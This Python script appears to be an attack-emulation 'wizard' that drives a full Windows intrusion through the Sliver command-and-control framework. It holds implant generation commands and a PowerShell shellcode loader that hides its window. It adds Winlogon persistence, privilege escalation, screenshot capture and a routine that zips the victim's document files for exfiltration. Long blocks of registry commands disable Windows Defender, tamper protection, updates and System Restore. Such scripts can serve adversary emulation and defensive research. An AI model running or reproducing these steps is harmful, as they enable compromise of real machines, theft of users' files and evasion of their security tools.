
import asyncio
from rich.console import Console
from rich.prompt import Confirm
from rich.panel import Panel
from typing import Dict
console = Console()
user_params: Dict[str, str] = {}
def print_welcome_message():
    console.print(
        Panel(
            "[bold blink yellow]🎯 Welcome to Attack Execution Wizard[/]",
            title="[bold green]Hello[/]",
            subtitle="[bold blue]Let's Begin[/]",
            expand=False,
        )
    )
def print_finished_message(message="Command completed!😊", status="info"):
    console.print(f"[bold green][FINISHED][/bold green] {message}")
def confirm_action(prompt: str = "Keep going with the next attack step?") -> bool:
    styled_prompt = f"[bold bright_cyan]{prompt}[/]"
    return Confirm.ask(
        styled_prompt,
        default="y",
        choices=["y", "n"],
        show_default=False,
    )      
async def main():
    print_welcome_message()
    from attack_executor.config import load_config
    config = load_config(config_file_path="/home/kali/Desktop/Aurora-executor-demo/config.ini")
    from attack_executor.post_exploit.Sliver import SliverExecutor
    sliver_executor = SliverExecutor(config=config)
    console.print("""\
        [bold green][MANUAL ACTION REQUIRED][/bold green]
        sliver > generate --mtls #{LHOST}:#{LPORT} --os windows --arch 64bit --format shellcode --save #{SAVE_PATH}
        sliver > mtls --lport #{LPORT}
        """)
    confirm_action()
    console.print("""\
        [bold green][MANUAL ACTION REQUIRED][/bold green]
        (This step needs human interaction and (temporarily) cannot be executed automatically)
        (On attacker's machine)
        python -m http.server

        (On victim's machine)
        1. Open #{LHOST}:#{LPORT} in the browser
        2. Navigate to the path of the file on the attacker's machine
        3. Download the file to #{PATH}
        """)
    confirm_action()
    console.print("""\
        [bold green][MANUAL ACTION REQUIRED][/bold green]
        (This step needs human interaction and (temporarily) cannot be executed automatically)
        (On victim's machine, open a powershell and execute these scripts)

        $s=[System.IO.File]::ReadAllBytes('#{SAVE_PATH}');
        $c='using System;using System.Runtime.InteropServices;public class W{[DllImport(\"kernel32\")]public static extern IntPtr VirtualAlloc(IntPtr a,uint b,uint c,uint d);[DllImport(\"kernel32\")]public static extern IntPtr CreateThread(IntPtr a,uint b,IntPtr c,IntPtr d,uint e,IntPtr f);[DllImport(\"kernel32\")]public static extern uint WaitForSingleObject(IntPtr a,uint b);[DllImport(\"kernel32.dll\")]public static extern IntPtr GetConsoleWindow();[DllImport(\"user32.dll\")]public static extern bool ShowWindow(IntPtr hWnd,int nCmdShow);}';Add-Type -TypeDefinition $c;$hwnd=[W]::GetConsoleWindow();if($hwnd -ne [IntPtr]::Zero){[W]::ShowWindow($hwnd,0)};
        $p=[W]::VirtualAlloc(0,$s.Length,0x3000,0x40);
        [System.Runtime.InteropServices.Marshal]::Copy($s,0,$p,$s.Length);
        $h=[W]::CreateThread(0,0,$p,0,0,0);[W]::WaitForSingleObject($h,0xFFFFFFFF)
        """)
    confirm_action()


    # Sliver-session selection
    console.print("[bold cyan]\n[Sliver Executor] Session Selection[/]")
    sliver_sessionid = await sliver_executor.select_sessions()

    user_params["SessionID"] = sliver_sessionid

    # Sliver command execution
    console.print(f"[bold cyan]\n[Sliver Executor] Executing: powershell[/]")
    confirm_action()
    try:
        await sliver_executor.powershell(user_params["SessionID"], user_params["Commands"])
    except Exception as e:
        console.print(f"[bold red]✗ Command failed: {str(e)}[/]")
        raise

    confirm_action()
    commands = """
    Get-Process
    """
    await sliver_executor.powershell(session_id=sliver_sessionid,input_commands=commands)

    print_finished_message()

    user_params["SessionID"] = sliver_sessionid

    # Sliver command execution
    console.print(f"[bold cyan]\n[Sliver Executor] Executing: ps[/]")
    confirm_action()
    try:
        await sliver_executor.ps(user_params["SessionID"])
    except Exception as e:
        console.print(f"[bold red]✗ Command failed: {str(e)}[/]")
        raise
    console.print("""\
        [bold green][MANUAL ACTION REQUIRED][/bold green]
        sliver > generate --mtls #{LHOST}:#{LPORT} --os windows --arch 64bit --format exe --save #{SAVE_PATH}
        sliver > mtls --lport #{LPORT}
        """)
    confirm_action()
    console.print("""\
        [bold green][MANUAL ACTION REQUIRED][/bold green]
        (This step needs human interaction and (temporarily) cannot be executed automatically)
        (On attacker's machine)
        python -m http.server

        (On victim's machine)
        1. Open #{LHOST}:#{LPORT} in the browser
        2. Navigate to the path of the file on the attacker's machine
        3. Download the file to #{PATH}
        """)
    confirm_action()

    confirm_action()
    commands = """
    Set-ItemProperty "HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\" "Shell" "explorer.exe, #{binary_to_execute}" -Force
    """
    await sliver_executor.powershell(session_id=sliver_sessionid,input_commands=commands)

    print_finished_message()


    confirm_action()
    commands = """
    $startingDirectory = "C:"
    $outputZip = "#{output_zip_folder_path}"
    $fileExtensionsString = ".doc, .docx, .txt"
    $fileExtensions = $fileExtensionsString -split ", "
    New-Item -Type Directory $outputZip -ErrorAction Ignore -Force | Out-Null
    Function Search-Files {
    param (
    [string]$directory
    )
    $files = Get-ChildItem -Path $directory -File -Recurse | Where-Object {
    $fileExtensions -contains $_.Extension.ToLower()
    }
    return $files
    }
    $foundFiles = Search-Files -directory $startingDirectory
    if ($foundFiles.Count -gt 0) {
    $foundFilePaths = $foundFiles.FullName
    Compress-Archive -Path $foundFilePaths -DestinationPath "$outputZip\data.zip"
    Write-Host "Zip file created: $outputZip\data.zip"
    } else {
    Write-Host "No files found with the specified extensions."
    }
    """
    await sliver_executor.powershell(session_id=sliver_sessionid,input_commands=commands)

    print_finished_message()

    console.print(f"[bold cyan]\n📌[Sliver Executor] Step 13 Parameter Input[/]")
    console.print(f"[bold yellow]  Parameter: remote_path[/]")
    console.print(f"  Description: Full path of the directory to create")
    default_val = ""
    user_input = console.input(
        f"[bold]➤ Enter value for remote_path [default: {default_val}]: [/]"
    ) or default_val
    if not user_input and False:
        raise ValueError("Missing required parameter: remote_path")
    user_params["remote_path"] = user_input

    user_params["SessionID"] = sliver_sessionid

    # Sliver command execution
    console.print(f"[bold cyan]\n[Sliver Executor] Executing: mkdir[/]")
    confirm_action()
    try:
        await sliver_executor.mkdir(user_params["remote_path"], user_params["SessionID"])
    except Exception as e:
        console.print(f"[bold red]✗ Command failed: {str(e)}[/]")
        raise

    confirm_action()
    commands = """
    dir #{input_file} -Recurse | Compress-Archive -DestinationPath #{output_file}
    """
    await sliver_executor.powershell(session_id=sliver_sessionid,input_commands=commands)

    print_finished_message()

    confirm_action()
    commands = """
    Add-Type -AssemblyName System.Windows.Forms
    $screen = [Windows.Forms.SystemInformation]::VirtualScreen
    $bitmap = New-Object Drawing.Bitmap $screen.Width, $screen.Height
    $graphic = [Drawing.Graphics]::FromImage($bitmap)
    $graphic.CopyFromScreen($screen.Left, $screen.Top, 0, 0, $bitmap.Size)
    $bitmap.Save("#{output_file}")
    """
    await sliver_executor.powershell(session_id=sliver_sessionid,input_commands=commands)

    print_finished_message()

    console.print(f"[bold cyan]\n📌[Sliver Executor] Step 16 Parameter Input[/]")
    console.print(f"[bold yellow]  Parameter: hosting_process[/]")
    console.print(f"  Description: Target process ID or name for privilege escalation")
    default_val = ""
    user_input = console.input(
        f"[bold]➤ Enter value for hosting_process [default: {default_val}]: [/]"
    ) or default_val
    if not user_input and False:
        raise ValueError("Missing required parameter: hosting_process")
    user_params["hosting_process"] = user_input

    console.print(f"[bold cyan]\n📌[Sliver Executor] Step 16 Parameter Input[/]")
    console.print(f"[bold yellow]  Parameter: config[/]")
    console.print(f"  Description: Configuration options for escalation method")
    default_val = "Service"
    user_input = console.input(
        f"[bold]➤ Enter value for config [default: {default_val}]: [/]"
    ) or default_val
    if not user_input and False:
        raise ValueError("Missing required parameter: config")
    user_params["config"] = user_input

    user_params["SessionID"] = sliver_sessionid

    # Sliver command execution
    console.print(f"[bold cyan]\n[Sliver Executor] Executing: get_system[/]")
    confirm_action()
    try:
        await sliver_executor.get_system(user_params["hosting_process"], user_params["config"], user_params["SessionID"])
    except Exception as e:
        console.print(f"[bold red]✗ Command failed: {str(e)}[/]")
        raise

    user_params["SessionID"] = sliver_sessionid

    # Sliver command execution
    console.print(f"[bold cyan]\n[Sliver Executor] Executing: powershell[/]")
    confirm_action()
    try:
        await sliver_executor.powershell(user_params["SessionID"], user_params["Commands"])
    except Exception as e:
        console.print(f"[bold red]✗ Command failed: {str(e)}[/]")
        raise


    confirm_action()
    commands = """
    bcdedit /set safeboot network
    """
    await sliver_executor.cmd(session_id=sliver_sessionid,input_commands=commands)

    print_finished_message()

    confirm_action()
    commands = """
    reg add \"HKLM\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU\" /v \"NoAutoUpdate\" /t REG_DWORD /d 1 /f

    """
    await sliver_executor.cmd(session_id=sliver_sessionid,input_commands=commands)

    print_finished_message()

    confirm_action()
    commands = """
    reg add \"HKLM\Software\Policies\Microsoft\Windows Defender\" /v \"DisableAntiSpyware\" /t REG_DWORD /d \"1\" /f >NUL 2>nul
    reg add \"HKLM\Software\Policies\Microsoft\Windows Defender\" /v \"DisableAntiVirus\" /t REG_DWORD /d \"1\" /f >NUL 2>nul
    reg add \"HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection\" /v \"DisableBehaviorMonitoring\" /t REG_DWORD /d \"1\" /f >NUL 2>nul
    reg add \"HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection\" /v \"DisableIntrusionPreventionSystem\" /t REG_DWORD /d \"1\" /f >NUL 2>nul
    reg add \"HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection\" /v \"DisableIOAVProtection\" /t REG_DWORD /d \"1\" /f >NUL 2>nul
    reg add \"HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection\" /v \"DisableOnAccessProtection\" /t REG_DWORD /d \"1\" /f >NUL 2>nul
    reg add \"HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection\" /v \"DisableRealtimeMonitoring\" /t REG_DWORD /d \"1\" /f >NUL 2>nul
    reg add \"HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection\" /v \"DisableRoutinelyTakingAction\" /t REG_DWORD /d \"1\" /f >NUL 2>nul
    reg add \"HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection\" /v \"DisableScanOnRealtimeEnable\" /t REG_DWORD /d \"1\" /f >NUL 2>nul
    reg add \"HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection\" /v \"DisableScriptScanning\" /t REG_DWORD /d \"1\" /f >NUL 2>nul
    reg add \"HKLM\Software\Policies\Microsoft\Windows Defender\Reporting\" /v \"DisableEnhancedNotifications\" /t REG_DWORD /d \"1\" /f >NUL 2>nul 
    reg add \"HKLM\Software\Policies\Microsoft\Windows Defender\SpyNet\" /v \"DisableBlockAtFirstSeen\" /t REG_DWORD /d \"1\" /f >NUL 2>nul
    reg add \"HKLM\Software\Policies\Microsoft\Windows Defender\SpyNet\" /v \"SpynetReporting\" /t REG_DWORD /d \"0\" /f >NUL 2>nul
    reg add \"HKLM\Software\Policies\Microsoft\Windows Defender\MpEngine\" /v \"MpEnablePus\" /t REG_DWORD /d \"0\" /f >NUL 2>nul
    reg add \"HKLM\SOFTWARE\Policies\Microsoft\Windows Defender Security Center\App and Browser protection\" /v \"DisallowExploitProtectionOverride\" /t REG_DWORD /d \"0\" /f >NUL 2>nul
    reg add \"HKLM\SOFTWARE\Microsoft\Windows Defender\Features\" /v \"TamperProtection\"  /t REG_DWORD /d \"0\" /f >NUL 2>nul
    reg add \"HKLM\software\microsoft\windows defender\spynet\" /v \"SubmitSamplesConsent\" /t REG_DWORD /d \"0\" /f >NUL 2>nul
    reg add \"HKLM\Software\Microsoft\Windows Defender\" /v \"PUAProtection\" /t REG_DWORD /d \"0\" /f >NUL 2>nul

    """
    await sliver_executor.cmd(session_id=sliver_sessionid,input_commands=commands)

    print_finished_message()

    confirm_action()
    commands = """
    reg add \"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\" /v HideSCANetwork /t REG_DWORD /d 1 /f

    """
    await sliver_executor.cmd(session_id=sliver_sessionid,input_commands=commands)

    print_finished_message()

    confirm_action()
    commands = """
    schtasks.exe /Change /TN \"\Microsoft\Windows\SystemRestore\SR\" /disable

    """
    await sliver_executor.cmd(session_id=sliver_sessionid,input_commands=commands)

    print_finished_message()

if __name__ == "__main__":
    asyncio.run(main())
